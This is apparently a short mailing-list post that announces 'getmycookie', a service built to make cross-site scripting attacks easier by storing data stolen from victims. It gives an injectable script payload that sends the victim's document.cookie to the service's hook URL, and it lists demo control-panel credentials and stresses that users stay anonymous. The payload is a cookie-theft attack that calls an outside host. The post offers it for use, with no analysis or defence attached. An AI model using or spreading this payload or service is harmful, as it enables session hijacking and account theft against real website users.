Subject: [OT] New online service to make XSSs easier

Hello,

I just would like you to know a new service that I want to publish. Its
called 'getmycookie' (www.getmycookie.com) and is going to be a service to
make easier to perform XSS attacks.

The website allow users to store there their extracted data from XSS's. For
example, if you are a user of getmycookie you could inject a xss as:

<script>document.writr('<img src="
http://getmycookie.com/hook.m3?hash=8f1c52809a3c3517820727961e277c4d397ba7019258e7a373&value="'
+  document.cookie + '>');</script>.

It would be stored into a database ('value' parameter) and it could be
obtained through the control panel of the user that owns the hash
'8f1c52809a3c3517820727961e277c4d397ba7019258e7a373'. (username: demo,
password: demo).

Is easy, fast, anonymous and you don't need to give any information about
you, just an username and password.

Greetings
